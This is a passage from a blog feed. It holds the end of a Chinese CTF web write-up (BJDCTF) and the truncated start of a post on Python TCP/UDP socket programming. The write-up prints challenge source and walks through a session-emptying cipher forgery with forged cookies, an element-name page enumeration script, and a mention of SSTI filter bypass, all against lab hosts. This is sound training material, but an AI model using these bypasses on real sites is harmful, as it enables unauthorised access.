class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//admin.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">$f1ag = <span class="string">'f1ag&#123;s1mpl3_SSRF_@nd_spr1ntf&#125;'</span>; <span class="comment">//fake</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aesEn</span><span class="params">($data, $key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $method = <span class="string">'AES-128-CBC'</span>;</span><br><span class="line">    $iv = md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>],<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">return</span>  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">'your_ip_address'</span>]) &amp;&amp; $_COOKIE[<span class="string">'your_ip_address'</span>] === md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &amp;&amp; $_COOKIE[<span class="string">'y1ng'</span>] === sha1(md5(<span class="string">'y1ng'</span>)))</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( $_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">"127.0.0.1"</span> ) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=black&gt;&lt;center&gt;&lt;font size='10px' color=white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is "</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">'user'</span>] = md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'decrypt'</span>])) &#123;</span><br><span class="line">    $decr = $_GET[<span class="string">'decrypt'</span>];</span><br><span class="line">    <span class="keyword">if</span> (Check())&#123;</span><br><span class="line">        $data = $_SESSION[<span class="string">'secret'</span>];</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'flag_2sln2ndln2klnlksnf.php'</span>;</span><br><span class="line">        $cipher = aesEn($data, <span class="string">'y1ng'</span>);</span><br><span class="line">        <span class="keyword">if</span> ($decr === $cipher)&#123;</span><br><span class="line">            <span class="keyword">echo</span> WHAT_YOU_WANT;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'爬'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        header(<span class="string">"Refresh:0.1;url=index.php"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//I heard you can break PHP mt_rand seed</span></span><br><span class="line">    mt_srand(rand(<span class="number">0</span>,<span class="number">9999999</span>));</span><br><span class="line">    $length = mt_rand(<span class="number">40</span>,<span class="number">80</span>);</span><br><span class="line">    $_SESSION[<span class="string">'secret'</span>] = bin2hex(random_bytes($length));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>进行审计关键判断</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'decrypt'</span>])) &#123;</span><br><span class="line">    $decr = $_GET[<span class="string">'decrypt'</span>];</span><br><span class="line">    <span class="keyword">if</span> (Check())&#123;</span><br><span class="line">        $data = $_SESSION[<span class="string">'secret'</span>];</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'flag_2sln2ndln2klnlksnf.php'</span>;</span><br><span class="line">        $cipher = aesEn($data, <span class="string">'y1ng'</span>);</span><br><span class="line">        <span class="keyword">if</span> ($decr === $cipher)&#123;</span><br><span class="line">            <span class="keyword">echo</span> WHAT_YOU_WANT;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'爬'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        header(<span class="string">"Refresh:0.1;url=index.php"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$decr 来自于$_GET[‘decrypt’]</p><p>$cipher来自aesEn($data, ‘y1ng’)函数加密后的结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aesEn</span><span class="params">($data, $key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $method = <span class="string">'AES-128-CBC'</span>;</span><br><span class="line">    $iv = md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>],<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">return</span>  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而$data来自于$_SESSION[‘secret’]</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mt_srand(rand(<span class="number">0</span>,<span class="number">9999999</span>));</span><br><span class="line">    $length = mt_rand(<span class="number">40</span>,<span class="number">80</span>);</span><br><span class="line">    $_SESSION[<span class="string">'secret'</span>] = bin2hex(random_bytes($length));</span><br></pre></td></tr></table></figure><p>随机数种子破解不了，但是可以把$_SESSION删除，从而使得$data为空</p><p>再生成根据函数生成一个decrypt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aesEn</span><span class="params">($data, $key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $method = <span class="string">'AES-128-CBC'</span>;</span><br><span class="line">    $iv = md5(<span class="string">"174.0.222.75"</span>,<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">return</span>  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line">$cipher = aesEn(<span class="string">''</span>, <span class="string">'y1ng'</span>);</span><br><span class="line"><span class="keyword">echo</span> $cipher;  <span class="comment">//70klfZeYC+WlC045CcKhtg==</span></span><br></pre></td></tr></table></figure><p><strong>注意<code>+</code>会被解析成空格，需要进行url编码</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin.php?decrypt=70klfZeYC%2bWlC045CcKhtg==</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 983604da-0b56-4811-b6e1-e8d833daa7b3.node3.buuoj.cn</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: y1ng=8880cbd71721332a25aa6df7b12eb7ac53539100; your_ip_address=76d9f00467e5ee6abc3ca60892ef304e</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure><p>即可拿到flag</p><h2 id="elementmaster"><a href="#elementmaster" class="headerlink" title="elementmaster"></a>elementmaster</h2><p>官方放出提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. http:&#x2F;&#x2F;gem-love.com&#x2F;em.txt</span><br><span class="line">比赛最后1h冲分，hint太长公告写不下，点上面url查看</span><br><span class="line">2.某处的神秘代码，Hex to String</span><br></pre></td></tr></table></figure><p>查看源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;BJDCTF&#39;s Cute Caricature&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body bgcolor&#x3D;white&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;mendeleev.jpg&quot;&gt;&lt;&#x2F;body&gt;</span><br><span class="line">&lt;p hidden id&#x3D;&quot;506F2E&quot;&gt;I am the real Element Masterrr!!!!!!&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p hidden id&#x3D;&quot;706870&quot;&gt;@颖奇L&#39;Amore&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>发现ID可疑，简ID解码后得到  Po.   和php，</p><p>访问得到一个   .    </p><p>根据提示访问元素周期表的页面，访问拼接得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 3/27/2020 3:57 PM</span></span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">strs = <span class="string">"H, He, Li, Be, B, C, N, O, F, Ne, Na, Mg, Al, Si, P, S, Cl, Ar,K, Ca, Sc, Ti, V, Cr, Mn, Fe, Co, Ni, Cu, Zn, Ga, Ge, As, Se, Br, Kr, Rb, Sr, Y, Zr, Nb, Mo, Te, Ru, Rh, Pd, Ag, Cd, In, Sn, Sb, Te, I, Xe, Cs, Ba, La, Ce, Pr, Nd, Pm, Sm, Eu, Gd, Tb, Dy, Ho, Er, Tm, Yb, Lu, Hf, Ta, W, Re, Os, Ir, Pt, Au, Hg, Tl, Pb, Bi, Po, At, Rn, Fr, Ra, Ac, Th, Pa, U, Np, Pu, Am, Cm, Bk, Cf, Es, Fm,Md, No, Lr,Rf, Db, Sg, Bh, Hs, Mt, Ds, Rg, Cn, Nh, Fl, Mc, Lv, Ts, Og, Uue"</span></span><br><span class="line"></span><br><span class="line">li = strs.replace(<span class="string">" "</span>,<span class="string">""</span>).split(<span class="string">","</span>)</span><br><span class="line">url = <span class="string">'http://7fa09155-1df7-469d-b620-9195f7a69f50.node3.buuoj.cn/'</span></span><br><span class="line">temp = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> x in li:</span><br><span class="line">    res = requests.get(url + x + <span class="string">'.php'</span>)</span><br><span class="line">    <span class="keyword">if</span> res.status_code != <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    temp += res.text</span><br><span class="line">    <span class="keyword">print</span>(temp)</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line"><span class="comment">#And_th3_3LemEnt5_w1LL_De5tR0y_y0u.php</span></span><br></pre></td></tr></table></figure><p>访问即可得到flag</p><h2 id="EasyAspDotNet"><a href="#EasyAspDotNet" class="headerlink" title="EasyAspDotNet"></a>EasyAspDotNet</h2>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;old-hack&quot;&gt;&lt;a href=&quot;#old-hack&quot; class=&quot;headerlink&quot; title=&quot;old-hack&quot;&gt;&lt;/a&gt;old-hack&lt;/h2&gt;&lt;p&gt;打开后是一个谷歌的界面，随意输入数据后查看源码，提示SSTI&lt;/p&gt;
&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;&amp;lt;!--ssssssti &amp;amp; a little trick --&amp;gt;&lt;/span&gt; P3&#39;s girlfirend is : 1&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;hr&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;测试过滤，非数字时{被过滤，使用url编码绕过即可&lt;/p&gt;
    
    </summary>
    
    
      <category term="刷题记录" scheme="https://sunny250.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="ctf" scheme="https://sunny250.github.io/tags/ctf/"/>
    
      <category term="web" scheme="https://sunny250.github.io/tags/web/"/>
    
      <category term="待补充" scheme="https://sunny250.github.io/tags/%E5%BE%85%E8%A1%A5%E5%85%85/"/>
    
      <category term="BDJCTF" scheme="https://sunny250.github.io/tags/BDJCTF/"/>
    
  </entry>
  
  <entry>
    <title>python 网络编程</title>
    <link href="https://sunny250.github.io/2020/03/14/python-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
    <id>https://sunny250.github.io/2020/03/14/python-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</id>
    <published>2020-03-14T07:11:38.000Z</published>
    <updated>2020-03-14T07:11:38.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在学校的课程中学到了有关网络编程的内容，在此记录一下。</p><a id="more"></a><p>实验要求</p><ol><li>是使用tcp、udp实现一个客户端与服务器的通信</li><li>使用原始套接字实现ping命令</li><li>实现GUI的客户端与服务器通信</li><li>实现GUI的简易浏览器</li><li>实现GUI的简单文件传输</li><li>实现GUI多人聊天系统</li></ol><h1 id="学习py相关的库"><a href="#学习py相关的库" class="headerlink" title="学习py相关的库"></a>学习py相关的库</h1><p><strong>socket库</strong>（参考自<a href="https://www.runoob.com/python/python-socket.html" target="_blank" rel="noopener">菜鸟教程</a>、<a href="https://docs.python.org/zh-cn/3/library/socket.html" target="_blank" rel="noopener">py官网</a>）</p><p>使用socket.socket()创建套接字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">socket.socket([family[, type[, proto]]])</span><br><span class="line">family: 套接字家族可以使AF_UNIX或者AF_INET（AF_INET6表示ipv6版本）</span><br><span class="line">type: SOCK_STREAM（TCP）、SOCK_DGRAM(UDP)、socket.SOCK_RAW（原始套接字）</span><br><span class="line">protocol: 一般不填默认为0</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">函数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">服务器端套接字</td><td align="left"></td></tr><tr><td align="left">s.bind()</td><td align="left">绑定地址（host,port）到套接字， 在AF_INET下,以元组（host,port）的形式表示地址。</td></tr><tr><td align="left">s.listen()</td><td align="left">开始TCP监听。backlog指定在拒绝连接之前，操作系统可以挂起的最大连接数量。该值至少为1，大部分应用程序设为5就可以了。</td></tr><tr><td align="left">s.accept()</td><td align="left">被动接受TCP客户端连接,(阻塞式)等待连接的到来</td></tr><tr><td align="left">客户端套接字</td><td align="left"></td></tr><tr><td align="left">s.connect()</td><td align="left">主动初始化TCP服务器连接，。一般address的格式为元组（hostname,port），如果连接出错，返回socket.error错误。</td></tr><tr><td align="left">s.connect_ex()</td><td align="left">connect()函数的扩展版本,出错时返回出错码,而不是抛出异常</td></tr><tr><td align="left">公共用途的套接字函数</td><td align="left"></td></tr><tr><td align="left">s.recv()</td><td align="left">接收TCP数据，数据以字符串形式返回，bufsize指定要接收的最大数据量。flag提供有关消息的其他信息，通常可以忽略。</td></tr><tr><td align="left">s.send()</td><td align="left">发送TCP数据，将string中的数据发送到连接的套接字。返回值是要发送的字节数量，该数量可能小于string的字节大小。</td></tr><tr><td align="left">s.sendall()</td><td align="left">完整发送TCP数据，完整发送TCP数据。将string中的数据发送到连接的套接字，但在返回之前会尝试发送所有数据。成功返回None，失败则抛出异常。</td></tr><tr><td align="left">s.recvfrom()</td><td align="left">接收UDP数据，与recv()类似，但返回值是（data,address）。其中data是包含接收数据的字符串，address是发送数据的套接字地址。</td></tr><tr><td align="left">s.sendto()</td><td align="left">发送UDP数据，将数据发送到套接字，address是形式为（ipaddr，port）的元组，指定远程地址。返回值是发送的字节数。</td></tr><tr><td align="left">s.close()</td><td align="left">关闭套接字</td></tr><tr><td align="left">s.getpeername()</td><td align="left">返回连接套接字的远程地址。返回值通常是元组（ipaddr,port）。</td></tr><tr><td align="left">s.getsockname()</td><td align="left">返回套接字自己的地址。通常是一个元组(ipaddr,port)</td></tr><tr><td align="left">s.setsockopt(level,optname,value)</td><td align="left">设置给定套接字选项的值。</td></tr><tr><td align="left">s.getsockopt(level,optname[.buflen])</td><td align="left">返回套接字选项的值。</td></tr><tr><td align="left">s.settimeout(timeout)</td><td align="left">设置套接字操作的超时期，timeout是一个浮点数，单位是秒。值为None表示没有超时期。一般，超时期应该在刚创建套接字时设置，因为它们可能用于连接的操作（如connect()）</td></tr><tr><td align="left">s.gettimeout()</td><td align="left">返回当前超时期的值，单位是秒，如果没有设置超时期，则返回None。</td></tr><tr><td align="left">s.fileno()</td><td align="left">返回套接字的文件描述符。</td></tr><tr><td align="left">s.setblocking(flag)</td><td align="left">如果flag为0，则将套接字设为非阻塞模式，否则将套接字设为阻塞模式（默认值）。非阻塞模式下，如果调用recv()没有发现任何数据，或send()调用无法立即发送数据，那么将引起socket.error异常。</td></tr><tr><td align="left">s.makefile()</td><td align="left">创建一个与该套接字相关连的文件</td></tr></tbody></table><h1 id="编写代码"><a href="#编写代码" class="headerlink" title="编写代码"></a>编写代码</h1><h3 id="1-服务端与客户端通信"><a href="#1-服务端与客户端通信" class="headerlink" title="1.  服务端与客户端通信"></a>1.  服务端与客户端通信</h3><h4 id="a-TCP"><a href="#a-TCP" class="headerlink" title="a. TCP"></a>a. TCP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Client.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : sunny250</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> tkinter</span><br><span class="line"></span><br><span class="line">cilent=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"><span class="comment"># print(socket.gethostbyaddr(8.8.8.8))</span></span><br><span class="line">port=<span class="number">14153</span></span><br><span class="line">host=socket.gethostname()</span><br><span class="line">cilent.connect((host,port))</span><br><span class="line">print(cilent.recv(<span class="number">1024</span>).decode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># cilent.close()</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    msg=input()</span><br><span class="line">    <span class="keyword">if</span> msg==<span class="string">'q!'</span>:</span><br><span class="line">        cilent.send(msg.encode())</span><br><span class="line">        cilent.close()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    cilent.send(msg.encode())</span><br><span class="line">    print(cilent.recv(<span class="number">1024</span>).decode())</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Server.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : sunny250</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">host=socket.gethostname()</span><br><span class="line"><span class="comment"># print(host)</span></span><br><span class="line">port=<span class="number">14153</span></span><br><span class="line">server.bind((host,port))</span><br><span class="line">server.listen(<span class="number">6</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="comment"># server.bind((host, port))</span></span><br><span class="line">    <span class="comment"># server.listen(5)</span></span><br><span class="line">    c,caddr=server.accept()</span><br><span class="line">    chost,cport=caddr</span><br><span class="line">    c.send(<span class="string">'已成功连接到服务器，你的地址是：'</span>.encode()+chost.encode()+<span class="string">'端口是：'</span>.encode()+str(cport).encode())</span><br><span class="line">    <span class="comment"># c.close()</span></span><br><span class="line">    msg=<span class="string">''</span></span><br><span class="line">    <span class="keyword">while</span> msg!=<span class="string">'q!'</span>:</span><br><span class="line">        msg=c.recv(<span class="number">1024</span>).decode()</span><br><span class="line">        smsg=time.ctime()+<span class="string">' '</span>+chost+<span class="string">':'</span>+str(cport)+<span class="string">'说'</span>+<span class="string">'\n'</span>+msg</span><br><span class="line">        print(smsg)</span><br><span class="line">        c.send(smsg.encode())</span><br><span class="line">    c.close()</span><br></pre></td></tr></table></figure><h4 id="b-UDP"><a href="#b-UDP" class="headerlink" title="b.UDP"></a>b.UDP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Client.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : sunny250</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">client=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</span><br><span class="line"></span><br><span class="line">port=<span class="number">14153</span></span><br><span class="line">host=<span class="string">"127.0.0.1"</span></span><br><span class="line">addr=(host,port)</span><br><span class="line"></span><br><span class="line">client.sendto(<span class="string">'hello'</span>.encode(), addr)</span><br><span class="line">msg,saddr=client.recvfrom(<span class="number">1024</span>)</span><br><span class="line">print(msg.decode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    msg=input()</span><br><span class="line">    <span class="keyword">if</span> msg==<span class="string">'q!'</span>:</span><br><span class="line">        client.sendto(msg.encode(), addr)</span><br><span class="line">        client.close()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    client.sendto(msg.encode(),addr)</span><br><span class="line">    rmsg,saddr=client.recvfrom(<span class="number">1024</span>)</span><br><span class="line">    print(rmsg.decode())</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Server.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : sunny250</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">server = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</span><br><span class="line"></span><br><span class="line">host=<span class="string">"127.0.0.1"</span></span><br><span class="line">port=<span class="number">14153</span></span><br><span class="line"></span><br><span class="line">server.bind((host,port))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    msg, caddr = server.recvfrom(<span class="number">1024</span>)   <span class="comment">#msg是服务器接受到客户端的数据，caddr是client的IP和端口</span></span><br><span class="line">    chost,cport=caddr   <span class="comment">#chost 即clienthost 客户端IP，cport客户端端口</span></span><br><span class="line">    server.sendto(<span class="string">'已成功连接到服务器，你的地址是：'</span>.encode()+chost.encode()+<span class="string">'端口是：'</span>.encode()+str(cport).encode(),caddr)</span><br><span class="line">    msg=<span class="string">''</span></span><br><span class="line">    <span class="keyword">while</span> msg!=<span class="string">'q!'</span>:</span><br><span class="line">        msg,caddr=server.recvfrom(<span class="number">1024</span>)</span><br><span class="line">        smsg=time.ctime()+<span class="string">' '</span>+chost+<span class="string">':'</span>+str(cport)+<span class="string">'说'</span>+<span class="string">'\n'</span>+msg.decode()</span><br><span class="line">        print(smsg)</span><br><span class="line">        server.sendto(smsg.encode(),caddr)</span><br><span class="line">    c.close()</span><br></pre></td></tr></table></figure><h3 id="2-原始套接字实现ping命令"><a href="#2-原始套接字实现ping命令" class="headerlink" title="2. 原始套接字实现ping命令"></a>2. 原始套接字实现ping命令</h3><p>套接字要实现对原始数据包的处理，需要了解数据包的格式参考来自<a href="http://c.biancheng.net/view/6411.html" target="_blank" 